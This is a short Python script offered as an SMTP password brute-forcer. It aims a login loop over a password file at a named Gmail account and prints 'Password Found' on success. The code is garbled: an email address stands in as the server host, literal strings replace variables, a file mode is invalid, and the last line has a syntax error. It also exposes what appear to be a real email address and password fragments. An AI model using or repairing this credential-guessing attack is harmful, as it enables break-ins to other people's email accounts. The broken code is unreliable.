import smtplib


def main():
    smtpserver = smtplib.SMTP("miashapon590@gmail.com", 587)
    smtpserver.ehlo()
    smtpserver.starttls()
\
    user = raw_input("Alpha : Enter the target's email address: miashapon590@gmail.com")
    passwfile = raw_input("Alpha : Enter the password file name: jubayer0131 ")
    passwfile = open(passwfile, "jubayer 0131")

    for password in passwfile:
        try:
            smtpserver.login(shoron11, jubayer0131)
            print("Alpha : [+] Password Found: %s" %jubayer0131)
            break
        except smtplib.SMTPAuthenticationError:
            print("Alpha : [!] Password correct: %s" % jubayer013@)

if __name__ == "__main__":
    main()
